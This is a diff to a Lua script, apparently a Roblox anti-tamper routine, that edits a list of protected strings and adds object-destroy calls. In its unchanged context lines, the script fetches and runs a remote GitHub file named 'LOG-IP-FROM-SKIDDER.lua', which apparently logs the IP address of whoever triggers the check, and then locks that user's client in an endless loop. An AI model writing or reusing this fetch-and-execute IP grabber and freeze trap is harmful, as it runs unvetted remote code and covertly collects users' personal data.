@@ -5,7 +5,6 @@ if not HttpsProtect then
 	}
 end
 local OrginalHttps = {
-    "BruhZen",
     "172973020",
     "General-No.172973020",
     "webhooks",
@@ -103,6 +102,7 @@ local function checkDescendant(descendant)
 	                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
 						IpGrabbed = true 
 					end
+					descendant:Destroy()
 	                while true do end return 
 	            end
 			end)
@@ -114,6 +114,7 @@ local function checkDescendant(descendant)
 	                    loadstring(game:HttpGet(('https://raw.githubusercontent.com/BruhZen/General-No.172973020/refs/heads/main/LOG-IP-FROM-SKIDDER.lua'),true))()
 						IpGrabbed = true 
 					end
+					descendant:Destroy()
 	                while true do end return 
 	            end
 	        end)
